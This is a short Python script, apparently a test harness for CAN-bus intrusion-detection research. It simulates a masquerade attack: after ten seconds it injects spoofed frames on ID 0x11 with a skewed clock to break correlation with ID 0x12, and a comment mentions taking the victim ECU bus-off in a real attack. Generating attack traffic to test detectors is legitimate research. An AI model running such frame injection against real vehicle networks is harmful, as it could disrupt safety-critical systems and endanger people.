"""
PAIRWISE MASQUERADE ATTACK
The attacker hijacks ID 0x11, but leaves ID 0x12 alone.
This breaks the correlation between the two messages.
"""
import time
import can
from bus_config import get_bus

# Attack configuration
TARGET_ID = 0x11
NORMAL_INTERVAL = 0.05 
T_MASQ = 10 
# Attacker runs on a slightly different clock (0.1% slower)
SKEW_FACTOR = 1.001 

def run_simulation():
    bus = get_bus()
    start_time = time.time()
    
    print(f"🎭 Pairwise Masquerade Script Active.")
    print(f"   [0-{T_MASQ}s]  Victim sending BOTH 0x11 and 0x12.")
    print(f"   [>{T_MASQ}s]   Attacker takes over 0x11 (Skew {SKEW_FACTOR}).")
    print(f"                 Victim continues sending 0x12 (Background).")

    # Note: You must run 'victim_dual.py' in the background for this to work!
    # This script only INJECTS the fake 0x11 after T_MASQ.
    # We assume we cannot physically stop the victim in this software sim, 
    # so we just add our messages. In a real attack, you'd bus-off the victim.
    
    while True:
        now = time.time()
        elapsed = now - start_time
        
        if elapsed > T_MASQ:
            # Inject Spoofed 0x11
            msg = can.Message(arbitration_id=TARGET_ID, data=b'\xDE\xAD', is_extended_id=False)
            bus.send(msg)
            
            # Attacker's Timing (Different Clock)
            time.sleep(NORMAL_INTERVAL * SKEW_FACTOR)
            print("\n🔥 PAIRWISE MASQUERADE ATTACK! Attacker sending fake 0x11.")
        else:
            # Waiting for attack time...
            time.sleep(0.1)
            print("waiting for attack time...", end='\r')

if __name__ == "__main__":
    run_simulation()